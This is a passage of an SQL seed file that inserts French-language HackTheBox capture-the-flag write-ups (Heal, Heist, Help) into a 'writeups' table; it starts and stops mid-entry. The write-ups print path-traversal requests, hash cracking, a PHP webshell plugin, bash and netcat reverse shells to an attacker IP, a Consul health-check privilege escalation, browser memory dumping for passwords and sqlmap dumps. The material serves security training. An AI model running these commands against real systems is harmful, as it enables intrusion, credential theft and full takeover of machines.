Le scan révèle deux ports : **22 (SSH)** et **80 (HTTP)**. Le serveur Web **Nginx** redirige vers `http://heal.htb/`. J''ajoute cette entrée à mon fichier `/etc/hosts`. L''empreinte du service (OpenSSH 8.9p1, Nginx 1.18.0) suggère une distribution **Ubuntu 22.04 (Jammy)**.

#### Énumération des VHosts
Compte tenu de la nature de la machine, je procède à un **Fuzzing** de sous-domaines avec **ffuf** pour découvrir d''éventuels points d''entrée isolés.

```bash
ffuf -u http://10.10.11.46 -H "Host: FUZZ.heal.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Je découvre deux sous-domaines supplémentaires :
*   `api.heal.htb` : Une API backend.
*   `take-survey.heal.htb` : Une instance **LimeSurvey**.

### 2. Analyse des Vecteurs d''Attaque Web

L''application principale sur `heal.htb` est un générateur de CV utilisant le framework **Express**. Une fonctionnalité attire mon attention : "Export as PDF". L''analyse des métadonnées du PDF généré via **exiftool** montre l''utilisation de **wkhtmltopdf 0.12.6**.

#### Analyse de l''API (api.heal.htb)
En interceptant le trafic avec **Burp Suite**, j''observe les interactions entre le frontend et l''API. L''API semble être développée avec **Ruby on Rails** (présence du header `X-Runtime`).
Les endpoints identifiés sont :
*   `POST /signin` : Authentification (JWT).
*   `POST /exports` : Envoi du contenu HTML pour conversion PDF.
*   `GET /download?filename=<name>` : Récupération du fichier généré.

### 3. Exploitation de la vulnérabilité Path Traversal

L''endpoint `/download` est un candidat idéal pour une vulnérabilité de type **Path Traversal** / **Arbitrary File Read**. Je teste l''accès aux fichiers système.

```bash
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../../../etc/passwd"
```

La lecture réussit, confirmant la vulnérabilité. Je peux désormais énumérer la configuration de l''application Rails. Je cible le fichier `config/database.yml` pour identifier la base de données.

> **Schéma Mental : De la lecture de fichier à l''exfiltration de base de données**
> 1. Identifier un paramètre contrôlé par l''utilisateur utilisé dans une fonction de lecture de fichier (`filename`).
> 2. Utiliser des séquences `../` pour sortir du répertoire `exports`.
> 3. Lire les fichiers de configuration (`database.yml`) pour localiser les fichiers de données.
> 4. Télécharger les fichiers de base de données SQLite pour une analyse hors-ligne.

Le fichier `database.yml` pointe vers `storage/development.sqlite3`. Je télécharge ce fichier via le même vecteur.

```bash
curl --path-as-is -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../storage/development.sqlite3" --output development.sqlite3
```

### 4. Extraction de Credentials & Mouvement Latéral

J''analyse la base SQLite localement pour extraire les condensats de mots de passe (**Hashes**).

```bash
sqlite3 development.sqlite3 "SELECT username, password_digest FROM users;"
# Résultat : ralph | $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

Le hash est au format **bcrypt** (ID 3200). Je lance **hashcat** avec la liste `rockyou.txt`.

```bash
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt
```

Le mot de passe identifié est `147258369`. Bien que ce mot de passe ne fonctionne pas pour SSH, il me permet d''accéder à l''interface d''administration de **LimeSurvey** sur `take-survey.heal.htb`, confirmant une politique de **Password Reuse**.

### 5. Brèche Initiale : LimeSurvey RCE

L''instance **LimeSurvey** (v6.6.4) permet aux administrateurs d''installer des **Plugins**. C''est un vecteur classique pour obtenir une **Remote Code Execution (RCE)**.

#### Création du Plugin Malveillant
Un plugin LimeSurvey nécessite au minimum un fichier PHP et un fichier `config.xml`. Je prépare un **Webshell** simple.

```php
// 0xdf.php
<?php system($_REQUEST[''cmd'']); ?>
```

Je crée une archive ZIP contenant `0xdf.php` et un `config.xml` valide (basé sur la documentation officielle). Une fois le plugin "uploadé" et installé via le panneau d''administration, il est accessible dans le répertoire des uploads.

#### Exécution du Reverse Shell
Je localise le point d''entrée du plugin dans `/upload/plugins/ExampleSettings/0xdf.php`. Je déclenche un **Reverse Shell** Bash.

```bash
# Listener
nc -lnvp 443

# Payload URL-encoded
curl -G "http://take-survey.heal.htb/upload/plugins/ExampleSettings/0xdf.php" --data-urlencode "cmd=bash -c ''bash -i >& /dev/tcp/10.10.14.6/443 0>&1''"
```

Je reçois une connexion entrante : je suis désormais `www-data` sur la machine **Heal**.

```bash
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Énumération Post-Exploitation & Accès Initial

Une fois l''accès à l''API obtenu, j''exploite un **Path Traversal** identifié sur l''endpoint `/download`. Cette vulnérabilité me permet de lire des fichiers sensibles et de récupérer la configuration de l''application **Ruby on Rails**.

```bash
# Lecture de /etc/passwd pour identifier les utilisateurs
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../../../etc/passwd"

# Récupération de la configuration de la base de données
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../config/database.yml"

# Téléchargement de la base SQLite3 de développement
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../storage/development.sqlite3" --output dev.sqlite3
```

L''analyse de la table `users` dans la base **SQLite3** révèle le hash **bcrypt** de l''administrateur `ralph`.

```bash
sqlite3 dev.sqlite3 "SELECT username, password_digest FROM users;"
# ralph | $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG

# Crack du hash via Hashcat (Mode 3200)
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt
# Résultat : 147258369
```

### Mouvement Latéral : De l''API à LimeSurvey

Le mot de passe de `ralph` est réutilisé sur l''instance **LimeSurvey** (`take-survey.heal.htb`). En tant qu''administrateur, je peux abuser du système de **Plugins** pour obtenir une **Remote Code Execution (RCE)**.

> **Schéma Mental : RCE via Plugin**
> 1. **Contrainte** : Le système attend un fichier `.zip` contenant un fichier `config.xml` valide.
> 2. **Payload** : Inclure un fichier PHP malveillant (`webshell.php`) dans l''archive.
> 3. **Exécution** : Le serveur décompresse l''archive dans `/upload/plugins/`. L''accès direct au fichier PHP déclenche l''exécution côté serveur.

```bash
# Préparation du plugin malveillant
echo ''<?php system($_REQUEST["cmd"]); ?>'' > 0xdf.php
# Ajout d''un config.xml légitime (récupéré de la doc LimeSurvey)
zip exploit.zip 0xdf.php config.xml
```

Après l''upload et l''activation du plugin, j''obtiens un **Reverse Shell** en tant que `www-data`.

```bash
# Trigger du shell
curl "http://take-survey.heal.htb/upload/plugins/0xdf/0xdf.php?cmd=bash+-c+''bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261''"
```

### Escalade de Privilèges : Vers l''utilisateur `ron`

L''énumération interne des fichiers de configuration de **LimeSurvey** (`application/config/config.php`) révèle des identifiants pour une base de données **PostgreSQL**.

```php
''connectionString'' => ''pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;''
```

Je teste ce mot de passe par **Password Spraying** sur les utilisateurs système identifiés dans `/etc/passwd` (`ralph`, `ron`, `postgres`).

```bash
netexec ssh 10.10.11.46 -u users.txt -p ''AdmiDi0_pA$$w0rd''
# [+] ron:AdmiDi0_pA$$w0rd Linux - Shell access!
```

### Escalade de Privilèges Root : Abus de Consul

En tant que `ron`, j''identifie un service **Consul** tournant avec les privilèges `root`. Le fichier de configuration `/etc/consul.d/config.json` indique que les **Script Checks** sont activés (`"enable_script_checks": true`) et que la politique ACL par défaut est permissive (`"acl_default_policy": "allow"`).

> **Schéma Mental : Privilege Escalation via Consul**
> Consul permet de définir des "Health Checks" qui exécutent des commandes pour vérifier l''état d''un service. Puisque l''agent tourne en `root` et qu''aucune authentification n''est requise sur l''API locale (port 8500), je peux enregistrer un nouveau service dont le "check" est une commande arbitraire.

```bash
# Création du payload de service (0xdf.json)
{
  "Name": "pwn-service",
  "ID": "pwn",
  "Check": {
    "args": ["bash", "-c", "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"],
    "interval": "10s"
  }
}

# Enregistrement du service via l''API REST locale
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d @0xdf.json
```

Une fois le délai de l''intervalle écoulé, le binaire **SUID** est créé dans `/tmp`.

```bash
# Obtention du shell root
/tmp/rootbash -p
whoami # root
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial obtenu en tant que `www-data` et la migration vers l''utilisateur `ron` effectuée grâce à la réutilisation de mot de passe trouvée dans la configuration **PostgreSQL** de **LimeSurvey**, mon objectif est d''atteindre les privilèges `root`.

#### Énumération du vecteur Consul

L''énumération des processus révèle une instance de **Consul** s''exécutant avec les privilèges `root`. L''examen des ports locaux via `netstat` confirme la présence des ports standards de **Consul**, notamment le port **8500** (**HTTP API**).

```bash
# Identification du processus Consul
ps auxww | grep consul
# Analyse de la configuration
cat /etc/consul.d/config.json
```

Le fichier de configuration `/etc/consul.d/config.json` contient deux directives critiques :
1.  `"enable_script_checks": true` : Autorise l''exécution de scripts arbitraires pour les **Health Checks**.
2.  `"acl_default_policy": "allow"` : Indique qu''aucune authentification n''est requise pour interagir avec l''**API**.

> **Schéma Mental : Exploitation de Consul Service Registration**
> Consul permet d''enregistrer des services via son **API REST**. Si les **Script Checks** sont activés et que l''**ACL** est permissive, un attaquant peut enregistrer un service factice associé à un **Health Check**. Ce check exécute une commande système à intervalle régulier avec les privilèges du processus **Consul** (ici `root`).

#### Exploitation : RCE via Service Registration

Je crée une charge utile au format **JSON** pour enregistrer un nouveau service. Le but est de créer une copie **SUID** de `/bin/bash` dans `/tmp`.

```json
{
  "Name": "pwn-service",
  "ID": "pwn-check",
  "Port": 0,
  "Check": {
      "args": ["bash", "-c", "cp /bin/bash /tmp/pwn && chmod 6777 /tmp/pwn"],
      "interval": "10s",
      "timeout": "5s"
  }
}
```

J''utilise `curl` pour envoyer cette configuration à l''**API** locale :

```bash
# Enregistrement du service malveillant
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H "Content-Type: application/json" -d @exploit.json

# Attente du déclenchement du Health Check et exécution du binaire SUID
/tmp/pwn -p
```

L''exécution avec l''option `-p` permet de conserver les privilèges effectifs, m''octroyant un shell `root` complet.

---

### Analyse Post-Exploitation : Beyond Root

L''analyse approfondie de la machine révèle une protection intéressante contre une vulnérabilité **SSRF** (Server-Side Request Forgery) connue sur **wkhtmltopdf** (CVE-2023-35583).

#### Le vecteur SSRF neutralisé
Le composant de génération de PDF utilise **wkhtmltopdf 0.12.6**. Normalement, l''injection d''une balise `<iframe src="http://10.10.14.6">` dans le contenu HTML envoyé à l''**API** devrait forcer le serveur à effectuer une requête vers mon IP. Cependant, l''application restait muette.

L''analyse du code source Ruby dans `/home/ralph/resume_api/app/controllers/exports_controller.rb` explique ce comportement :

```ruby
command = "wkhtmltopdf --proxy None --user-style-sheet #{css_path} - #{filepath}"
```

L''utilisation de l''option `--proxy None` agit comme une mesure de durcissement (Hardening). En forçant un proxy inexistant nommé "None", **wkhtmltopdf** tente de résoudre ce nom via **DNS**. La résolution échoue, ce qui interrompt toute tentative de connexion réseau sortante initiée par le moteur de rendu, neutralisant ainsi l''**SSRF**.

#### Vérification de la mitigation
Pour confirmer cette analyse, j''ai modifié le code source pour supprimer l''option `--proxy None` et redémarré le service `run_api`. Après cette modification, l''injection d''**iframe** est devenue fonctionnelle, confirmant que la vulnérabilité était présente mais volontairement bridée par une configuration spécifique de la ligne de commande.

Cette technique de "Proxy None" est une méthode pragmatique pour limiter l''exposition réseau d''outils de rendu HTML sans modifier le binaire lui-même.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'Ma phase de reconnaissance commence par un scan **Nmap** classique pour identifier les ports ouverts et les services associés. Le scan révèle deux ports : **22 (SSH)** et **80 (HTTP)**. Le serveur Web **Nginx** redirige vers `http://heal.htb/`. J''ajo...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-heal-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Heist
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Heist',
  'htb-heist',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

L''objectif de cette phase est de cartographier la surface d''attaque de la machine **Heist** et d''exploiter des informations fuitées pour obtenir un premier point d''ancrage sur le système via **WinRM**.

#### 1. Énumération des Services (Scanning)

Je débute par un scan **Nmap** complet pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.149

# Scan détaillé des services identifiés
nmap -sC -sV -p 80,135,445,5985,49669 -oA scans/nmap-tcpscripts 10.10.10.149
```

**Résultats clés :**
*   **Port 80 (HTTP) :** Microsoft IIS 10.0 (indique potentiellement Windows Server 2016/2019).
*   **Port 135/49669 (RPC) :** Microsoft Windows RPC.
*   **Port 445 (SMB) :** Microsoft-ds.
*   **Port 5985 (WinRM) :** Windows Remote Management (vecteur potentiel de shell).

#### 2. Énumération Web & Fuite de Configuration

En naviguant sur le port 80, je tombe sur une page de **Support Login**. L''accès en tant que "Guest" est autorisé et me redirige vers une interface de gestion d''incidents (**Issues page**). Un ticket posté par l''utilisateur **hazard** contient une pièce jointe : un fichier de configuration **Cisco IOS**.

Le fichier révèle trois hashs de mots de passe et des noms d''utilisateurs potentiels :
*   `enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91` (**Cisco Type 5** - MD5)
*   `username rout3r password 7 0242114B0E143F015F5D1E161713` (**Cisco Type 7** - XOR propriétaire)
*   `username admin password 7 02375012182C1A1D751618034F36415408` (**Cisco Type 7**)

#### 3. Analyse et Crackage des Identifiants

Je procède au déchiffrement des hashs pour constituer une liste de credentials.

*   **Cisco Type 5 :** Utilisant **John the Ripper** avec la wordlist `rockyou.txt`.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_type5.txt
# Résultat : stealth1agent
```

*   **Cisco Type 7 :** Ce format est réversible car il utilise un algorithme de chiffrement faible basé sur une clé statique. J''utilise un script Python pour extraire le texte clair.
```python
# Logique de déchiffrement Type 7
# Clé statique : "tfd;kfoA,.iyewrkldJKD"
# Résultat 1 : $uperP@ssword
# Résultat 2 : Q4)sJu\Y8qz*A3?d
```

**Inventaire des credentials :**
*   **Users :** `hazard`, `admin`, `rout3r`
*   **Passwords :** `stealth1agent`, `$uperP@ssword`, `Q4)sJu\Y8qz*A3?d`

> **Schéma Mental :**
> L''attaquant exploite une mauvaise configuration web (accès Guest) pour récupérer des fichiers de configuration réseau. Ces fichiers contiennent des hashs obsolètes (Type 7) ou crackables (Type 5), permettant de construire une base de données d''identifiants pour des attaques par **Password Spraying** sur les services d''authentification Windows (SMB/RPC/WinRM).

#### 4. Énumération RPC & SID Cycling

Je teste la validité des identifiants sur le service **SMB** via **CrackMapExec**.

```bash
crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt
```
L''utilisateur `hazard:stealth1agent` est valide mais n''a accès qu''au partage **IPC$**. Bien que limité, ce partage permet d''interroger le service **LSA** (Local Security Authority) via **rpcclient**.

Je réalise un **SID Cycling** pour énumérer tous les utilisateurs du domaine/machine.

```bash
# Utilisation de lookupsid.py d''Impacket
lookupsid.py hazard:stealth1agent@10.10.10.149
```

**Nouveaux utilisateurs identifiés :**
*   `support` (SID 1009)
*   `Chase` (SID 1012)
*   `Jason` (SID 1013)

#### 5. Brèche Initiale via WinRM

Avec cette nouvelle liste d''utilisateurs, je relance une attaque par dictionnaire sur le service **WinRM** (port 5985).

```bash
# Tentative de connexion avec Evil-WinRM
ruby evil-winrm.rb -i 10.10.10.149 -u chase -p ''Q4)sJu\Y8qz*A3?d''
```

L''authentification réussit pour l''utilisateur **chase**. J''obtiens un shell interactif **PowerShell**, ce qui me permet de récupérer le premier flag.

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
```

---

### Énumération Interne & Vecteurs d''Accès

Après avoir extrait des identifiants d''une configuration Cisco (Type 5 et Type 7), je dispose d''une liste de candidats potentiels pour l''authentification. L''objectif est de valider ces derniers contre les services actifs, notamment **SMB** et **WinRM**.

```bash
# Validation des credentials avec CrackMapExec
crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt

# Résultat : SUPPORTDESK\hazard:stealth1agent (Accès IPC$ uniquement)
```

L''utilisateur `hazard` n''a pas de droits sur les partages de fichiers classiques mais peut interagir avec le partage **IPC$** (**Inter-Process Communication**). Ce partage est un vecteur privilégié pour l''énumération de comptes via des appels **RPC**.

> **Schéma Mental : Énumération par SID Brute-forcing**
> L''accès au partage **IPC$** permet d''interroger le **SAM** (Security Account Manager) distant. En itérant sur les **RID** (Relative Identifiers) à la fin du **SID** (Security Identifier) de la machine, on peut forcer le système à révéler les noms d''utilisateurs associés, même sans accès administratif.

```bash
# Énumération des utilisateurs via lookupsid.py (Impacket)
lookupsid.py hazard:stealth1agent@10.10.10.149

# Utilisateurs découverts :
# 500: Administrator
# 1008: Hazard
# 1009: support
# 1012: Chase
# 1013: Jason
```

### Mouvement Latéral : Accès WinRM

Avec cette nouvelle liste d''utilisateurs, je procède à un **Password Spraying** ciblé. Le service **WinRM** (port 5985) est ouvert, ce qui permet d''obtenir un shell **PowerShell** distant si les identifiants sont valides.

```bash
# Tentative de connexion WinRM pour l''utilisateur Chase
evil-winrm -i 10.10.10.149 -u chase -p ''Q4)sJu\Y8qz*A3?d''
```

L''authentification réussit pour `chase`. Je récupère le premier flag dans `C:\Users\Chase\Desktop\user.txt`.

---

### Escalade de Privilèges : Analyse de la mémoire Processus

L''énumération locale du répertoire personnel de `chase` révèle un fichier `todo.txt` indiquant que l''utilisateur consulte régulièrement la liste des tickets de support. Une vérification des processus actifs montre que plusieurs instances de **Firefox** sont en cours d''exécution.

> **Schéma Mental : Extraction de secrets du Process Memory**
> Lorsqu''un utilisateur saisit des identifiants dans un formulaire Web, ces données transitent en clair dans la mémoire vive du processus du navigateur avant d''être chiffrées ou envoyées. En effectuant un **Memory Dump** du processus `firefox.exe`, il est possible de retrouver des chaînes de caractères correspondant à des requêtes **HTTP POST** contenant des mots de passe.

#### Méthode 1 : Dump manuel avec Procdump
J''utilise **Procdump** (Suite Sysinternals) pour capturer l''état de la mémoire d''un processus Firefox.

```powershell
# Identification du PID de Firefox
Get-Process firefox

# Création du dump mémoire (PID 6252 par exemple)
.\procdump64.exe -ma 6252 -accepteula firefox.dmp
```

Une fois le fichier `.dmp` rapatrié sur ma machine d''attaque, j''utilise `grep` avec une **Regular Expression** (Regex) pour isoler les paramètres de connexion typiques d''un formulaire de login.

```bash
# Recherche de patterns de login dans le dump binaire
grep -aoE ''login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login='' firefox.dmp

# Résultat : login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

#### Méthode 2 : Automatisation avec MimiKittenz
Il est également possible d''utiliser le script PowerShell **MimiKittenz**, qui automatise la lecture de la mémoire des processus utilisateur pour y chercher des secrets via des signatures prédéfinies.

```powershell
# Import et exécution de MimiKittenz (après modification du script pour cibler Heist)
Import-Module .\Invoke-mimikittenz.ps1
Invoke-mimikittenz
```

### Accès Final (Administrator)

Le mot de passe extrait de la mémoire de Firefox (`4dD!5}x/re8]FBuZ`) correspond au hash SHA256 trouvé précédemment dans le code source de `login.php`. Par une pratique courante de **Password Reuse**, ce mot de passe est testé avec succès pour le compte **Administrator** local de la machine.

```bash
# Connexion finale en tant qu''administrateur
evil-winrm -i 10.10.10.149 -u administrator -p ''4dD!5}x/re8]FBuZ''
```

L''accès est total, permettant la récupération du flag `root.txt` dans le profil de l''administrateur.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant que **chase**, mon objectif est d''identifier des vecteurs permettant d''atteindre le groupe **Administrators**. L''énumération locale révèle rapidement une activité utilisateur inhabituelle et une mauvaise hygiène de gestion des secrets.

#### 1. Énumération des artefacts et processus
En inspectant le bureau de l''utilisateur, je trouve un fichier `todo.txt` indiquant que `chase` doit vérifier régulièrement la liste des tickets de support. Parallèlement, l''examen des processus actifs montre plusieurs instances de **Firefox** en cours d''exécution.

```powershell
# Liste des processus Firefox actifs
Get-Process firefox

# Lecture du fichier de tâches
type C:\Users\chase\Desktop\todo.txt
```

> **Schéma Mental :** L''utilisateur `chase` est actif et utilise **Firefox** pour consulter une application de support. Puisque les formulaires **HTTP POST** transitent en clair dans la mémoire du processus (ou y restent après soumission), un **Memory Dump** du processus `firefox.exe` permet d''extraire des identifiants sensibles. Cette technique ne nécessite pas de privilèges **SYSTEM**, car je possède déjà les droits de l''utilisateur propriétaire du processus.

#### 2. Extraction de secrets via Memory Forensics
Je décide de dumper la mémoire de l''un des processus Firefox pour y rechercher des chaînes de caractères liées à l''authentification de l''application web de support (identifiée en Phase 1).

J''utilise **procdump64.exe** (de la suite Sysinternals) pour générer le dump, puis je rapatrie le fichier pour une analyse hors-ligne.

```powershell
# Création du dump mémoire d''un PID Firefox (ex: 6252)
.\procdump64.exe -ma 6252 -accepteula firefox_dump.dmp
```

Sur ma machine d''attaque, j''utilise **grep** avec une **Regular Expression (Regex)** ciblée sur le format des requêtes **POST** observé précédemment sur la page `login.php`.

```bash
# Recherche de patterns de login dans le dump binaire
grep -aoE ''login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login='' firefox_dump.dmp
```

**Résultat :** L''extraction révèle les identifiants `admin@support.htb` avec le mot de passe `4dD!5}x/re8]FBuZ`.

#### 3. Domination Totale (Root)
Une vulnérabilité classique en environnement Windows est la **Credential Reuse** (réutilisation de mots de passe). Je teste si le mot de passe de l''administrateur de l''application web est identique à celui du compte **Administrator** local de la machine via **WinRM**.

```bash
# Connexion finale via Evil-WinRM
ruby evil-winrm.rb -i 10.10.10.149 -u Administrator -p ''4dD!5}x/re8]FBuZ''
```

La connexion réussit, m''octroyant un shell avec les privilèges les plus élevés sur le système.

---

### Analyse Post-Exploitation "Beyond Root"

L''analyse de la compromission de **Heist** met en évidence plusieurs failles structurelles :

1.  **Hardcoded Credentials & Weak Hashing :** Le fichier `login.php` contenait un mot de passe administrateur codé en dur. Bien que haché en **SHA256**, l''absence de **Salt** et la réutilisation de ce même mot de passe pour le compte système ont rendu la compromission triviale une fois le secret extrait de la mémoire.
2.  **Memory Hygiene :** Les navigateurs web comme **Firefox** conservent des données sensibles (formulaires, cookies, mots de passe saisis) dans l''espace mémoire utilisateur. Un attaquant ayant compromis un compte standard peut effectuer un **Process Injection** ou un **Memory Dump** pour pivoter verticalement sans exploiter de vulnérabilité noyau (Kernel Exploit).
3.  **Cisco Type 7 Vulnerability :** La phase initiale a reposé sur l''extraction de mots de passe depuis une configuration Cisco. L''utilisation de l''algorithme **Type 7** est une faute grave, car il s''agit d''un chiffrement réversible (XOR avec une clé statique) et non d''un hachage sécurisé.
4.  **Information Leakage via RPC :** L''accès en lecture à l''**IPC$** a permis une énumération précise des utilisateurs via **SID Brute Forcing** (`lookupsids`), facilitant grandement les attaques par **Password Spraying**.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['SMB', 'Web', 'Privilege Escalation'],
  'L''objectif de cette phase est de cartographier la surface d''attaque de la machine **Heist** et d''exploiter des informations fuitées pour obtenir un premier point d''ancrage sur le système via **WinRM**. Je débute par un scan **Nmap** complet pour iden...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-heist-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Help
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Help',
  'htb-help',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération des Services

Ma méthodologie commence par un scan **Nmap** complet pour identifier la surface d''attaque. La machine présente trois ports ouverts, suggérant un vecteur d''entrée via des services web.

```bash
# Scan rapide de tous les ports
nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.121

# Scan de détection de services et scripts par défaut
nmap -sC -sV -p 22,80,3000 -oA nmap/scripts 10.10.10.121
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 7.2p2 (Ubuntu).
*   **Port 80 (HTTP) :** Apache 2.4.18. Page par défaut d''Ubuntu.
*   **Port 3000 (HTTP) :** Node.js Express framework. Retourne un JSON mentionnant une requête pour obtenir des credentials.

---

## 2. Analyse de l''API GraphQL (Port 3000)

L''application sur le port 3000 semble être une interface **GraphQL**. Ce type d''API est souvent vulnérable à l''**Introspection**, permettant de reconstruire l''intégralité du schéma de données.

> **Schéma Mental :**
> Identifier le point d''entrée API (`/graphql`) -> Utiliser des requêtes d''introspection pour lister les types -> Identifier le type `User` -> Extraire les champs `username` et `password`.

J''utilise `curl` et `jq` pour énumérer le schéma :

```bash
# Extraction des types du schéma
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d ''{"query": "{ __schema { types { name } } }"}'' | jq .

# Extraction des champs du type "User"
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d ''{"query": "{ __type(name: \"User\") { name fields { name } } }"}'' | jq .

# Récupération des données utilisateurs
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d ''{"query": "{ user { username password } }"}'' | jq .
```

L''API retourne un hash MD5 pour l''utilisateur `helpme@helpme.com` : `5d3c93182bb20f07b994a7f617e99cff`. Un passage sur **CrackStation** révèle le mot de passe en clair : **godhelpmeplz**.

---

## 3. Énumération Web & HelpDeskZ (Port 80)

Le port 80 ne montre rien d''intéressant à la racine. Je lance un **Fuzzing** de répertoires avec **Gobuster**.

```bash
gobuster dir -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
```

Le répertoire `/support` est découvert. Il héberge une instance de **HelpDeskZ v1.0.2**. Les identifiants obtenus précédemment via GraphQL permettent de s''authentifier sur cette plateforme.

---

## 4. Vecteur d''Attaque A : Authenticated SQL Injection

En analysant la gestion des tickets, je remarque que le téléchargement des pièces jointes utilise des paramètres vulnérables. L''URL ressemble à ceci :
`http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6`

Le dernier paramètre est sujet à une **Blind SQL Injection**.

> **Schéma Mental :**
> Injecter une condition logique (`AND 1=1` vs `AND 1=2`) -> Observer la réponse (téléchargement réussi vs message d''erreur) -> Automatiser l''extraction de la base de données.

J''utilise **sqlmap** pour automatiser l''extraction après avoir intercepté la requête avec **Burp Suite** :

```bash
sqlmap -r ticket_attachment.request --level 5 --risk 3 -p "param[]" --dbms=mysql --dump -T staff
```

**Résultat :** Extraction du hash de l''administrateur `d318f44739dced66793b1a603028133a76ae680e` (Welcome1). Ce mot de passe permet une connexion **SSH** directe avec l''utilisateur `help`.

---

## 5. Vecteur d''Attaque B : Arbitrary File Upload (Unintended)

Une vulnérabilité critique réside dans la fonction d''upload de **HelpDeskZ 1.0.2**. Le logiciel vérifie l''extension du fichier *après* l''avoir déplacé dans le répertoire temporaire, mais ne le supprime pas en cas d''erreur.

Le nom du fichier est généré selon l''algorithme suivant : `md5(filename + time())`.

### Exploitation :
1.  Uploader un fichier `cmd.php`.
2.  Le serveur rejette le fichier ("File not allowed").
3.  Brute-forcer le nom du fichier en se basant sur le **Timestamp** du serveur (récupéré via le header HTTP `Date`).

```python
# Extrait de la logique de brute-force du nom de fichier
currentTime = int(time.time())
for x in range(0, 1200): # Fenêtre de 20 minutes
    plaintext = "cmd.php" + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()
    url = "http://10.10.10.121/support/uploads/tickets/" + md5hash + ".php"
    if requests.head(url).status_code == 200:
        print("Found: " + url)
```

---

## 6. Premier Shell

Une fois l''URL du **Webshell** identifiée, j''exécute un **Reverse Shell** pour stabiliser mon accès.

```bash
# Payload Reverse Shell
curl ''http://10.10.10.121/support/uploads/tickets/[HASH].php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f''

# Stabilisation du TTY
python -c ''import pty; pty.spawn("/bin/bash")''
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je possède désormais un accès interactif avec l''utilisateur **help** et je peux lire le flag `user.txt`.

---

### Mouvement Latéral : Exploitation de HelpDeskZ (v1.0.2)

Une fois les identifiants `helpme@helpme.com` : `godhelpmeplz` récupérés via l''API **GraphQL**, l''accès à l''instance **HelpDeskZ** sur `/support` est possible. Deux vecteurs d''attaque se présentent pour obtenir un accès initial ou pivoter vers un compte système.

#### Option A : Authenticated Blind SQL Injection
Le paramètre `param[]` dans la fonctionnalité de visualisation des pièces jointes est vulnérable à une **Blind SQL Injection**. En créant un ticket avec une pièce jointe, on génère une URL de type : `?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6`.

